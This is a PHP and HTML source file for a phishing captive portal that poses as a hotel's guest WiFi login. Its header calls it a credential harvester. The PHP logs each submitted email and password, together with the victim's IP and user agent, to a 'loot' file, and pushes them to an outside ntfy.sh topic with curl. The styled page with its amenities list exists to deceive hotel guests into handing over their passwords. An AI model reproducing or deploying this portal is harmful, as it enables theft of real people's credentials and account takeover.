<?php
// GARMR HOTEL Portal - Credential Harvester
$loot_file = "/root/loot/garmr/credentials.txt";
$ntfy_topic = trim(@file_get_contents("/root/.garmr_ntfy_topic"));

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = isset($_POST["email"]) ? $_POST["email"] : "";
    $password = isset($_POST["password"]) ? $_POST["password"] : "";
    $timestamp = date("Y-m-d H:i:s");
    $ip = $_SERVER["REMOTE_ADDR"];
    $ua = $_SERVER["HTTP_USER_AGENT"];
    @mkdir(dirname($loot_file), 0755, true);
    $entry = "[$timestamp] HOTEL | IP: $ip | Email: $email | Pass: $password | UA: $ua\n";
    file_put_contents($loot_file, $entry, FILE_APPEND | LOCK_EX);
    
    if (!empty($ntfy_topic)) {
        $msg = "🏨 HOTEL CREDS\n📧 $email\n🔑 $password\n🌐 $ip";
        $cmd = "curl -s -d " . escapeshellarg($msg) . " https://ntfy.sh/$ntfy_topic" . " 2>/dev/null";
        shell_exec($cmd);
    }
    
    header("Location: /success.html");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hotel Guest WiFi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #44337a 0%, #6b46c1 50%, #9f7aea 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 16px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .logo {
            width: 100px;
            height: 100px;
            margin: 0 auto 20px;
        }
        .logo svg {
            width: 100%;
            height: 100%;
        }
        h1 {
            color: #44337a;
            font-size: 22px;
            margin-bottom: 8px;
            font-weight: 600;
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 16px;
            text-align: left;
        }
        label {
            display: block;
            color: #44337a;
            font-weight: 500;
            margin-bottom: 6px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        input:focus {
            outline: none;
            border-color: #6b46c1;
        }
        button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #6b46c1 0%, #9f7aea 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: transform 0.2s;
        }
        button:hover {
            transform: scale(1.02);
        }
        .amenities {
            margin-top: 20px;
            padding: 15px;
            background: #FAF5FF;
            border-radius: 8px;
            font-size: 13px;
            color: #44337a;
        }
        .amenities-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 10px;
        }
        .amenity {
            font-size: 11px;
            color: #666;
        }
        .terms {
            margin-top: 20px;
            font-size: 11px;
            color: #999;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <!-- Hotel building icon -->
                <rect x="20" y="30" width="60" height="60" fill="#6b46c1" rx="4"/>
                <rect x="25" y="35" width="50" height="50" fill="#44337a" rx="2"/>
                <!-- Windows -->
                <rect x="30" y="40" width="10" height="10" fill="#FFF8E7" rx="1"/>
                <rect x="45" y="40" width="10" height="10" fill="#FFF8E7" rx="1"/>
                <rect x="60" y="40" width="10" height="10" fill="#FFF8E7" rx="1"/>
                <rect x="30" y="55" width="10" height="10" fill="#FFF8E7" rx="1"/>
                <rect x="45" y="55" width="10" height="10" fill="#9f7aea" rx="1"/>
                <rect x="60" y="55" width="10" height="10" fill="#FFF8E7" rx="1"/>
                <!-- Door -->
                <rect x="42" y="70" width="16" height="20" fill="#9f7aea" rx="2"/>
                <circle cx="55" cy="80" r="1.5" fill="#FFD700"/>
                <!-- Roof accent -->
                <rect x="35" y="25" width="30" height="8" fill="#9f7aea" rx="2"/>
                <!-- Star -->
                <text x="46" y="22" fill="#FFD700" font-size="12">★</text>
            </svg>
        </div>

        <h1>Hotel Guest WiFi</h1>
        <p class="subtitle">Welcome! Connect to complimentary WiFi</p>

        <form method="POST" action="">
            <div class="form-group">
                <label for="room">Room Number</label>
                <input type="text" id="room" name="room" placeholder="e.g. 412" required>
            </div>
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="your@email.com" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Connect to Guest WiFi</button>
        </form>

        <div class="amenities">
            <strong>Guest Amenities</strong>
            <div class="amenities-grid">
                <span class="amenity">🏊 Pool</span>
                <span class="amenity">🍳 Breakfast</span>
                <span class="amenity">🅿️ Parking</span>
                <span class="amenity">💪 Gym</span>
                <span class="amenity">🛎️ Concierge</span>
                <span class="amenity">🧺 Laundry</span>
            </div>
        </div>

        <p class="terms">
            By connecting, you agree to the Hotel's Terms of Service.
            WiFi is complimentary for registered guests.
        </p>
    </div>
</body>
</html>
